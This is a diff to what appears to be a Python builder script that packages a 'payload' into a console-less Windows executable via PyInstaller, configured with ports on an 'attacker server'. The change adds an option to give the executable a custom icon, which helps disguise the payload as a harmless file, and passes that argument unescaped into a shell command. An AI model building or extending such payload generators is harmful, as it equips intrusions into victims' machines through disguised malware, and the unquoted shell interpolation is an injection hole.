@@ -1,3 +1,4 @@
+import re
 import subprocess
 import argparse
 import os
@@ -48,8 +49,13 @@ def main():
    
    #improve code below, written for testing purposes
    print("[*]Generating payload...(This may take some time)")
-   subprocess.run(f"pyinstaller --onefile --windowed  {__PAYLOAD_FILE_NAME}",shell=True,capture_output=FLAG)
+   if args.icon:
+      subprocess.run(f"pyinstaller --onefile --windowed --icon {args.icon}  {__PAYLOAD_FILE_NAME}",shell=True,capture_output=FLAG)
+   else:
+      subprocess.run(f"pyinstaller --onefile --windowed  {__PAYLOAD_FILE_NAME}",shell=True,capture_output=FLAG)
+   
    sleep(1)
+   
    if os.path.isdir("./build"): 
       shutil.rmtree("./build")
    if os.path.exists("payload.spec"):
@@ -58,7 +64,7 @@ def main():
    os.rename("./dist/payload.exe","./payload.exe")
    os.rmdir("./dist")
    if args.name:
-      os.rename((__PAYLOAD_FILE_NAME[:-2]+"exe"),args.name)
+      os.rename((__PAYLOAD_FILE_NAME[:-2]+"exe"),f"./executables/{args.name}.exe")
 
 
 if __name__ == "__main__":
@@ -70,5 +76,6 @@ if __name__ == "__main__":
   parse.add_argument("-M","--main",required=False,type=int,dest="port",default=5000,help="Main port on attacker server, see docs for informations. Defaults to 5000")
   parse.add_argument("-N","--name",required=False,type=str,dest="name",default="payload",help="File name of payload object file, defaults to payload.exe")
   parse.add_argument("-v",required=False,action="store_true",dest="verbose",help="Verbose")
+  parse.add_argument("-i","--icon",required=False,type=str,dest="icon",help="Icon for executable, note that it must be in .ico format")
   args = parse.parse_args()
   main()
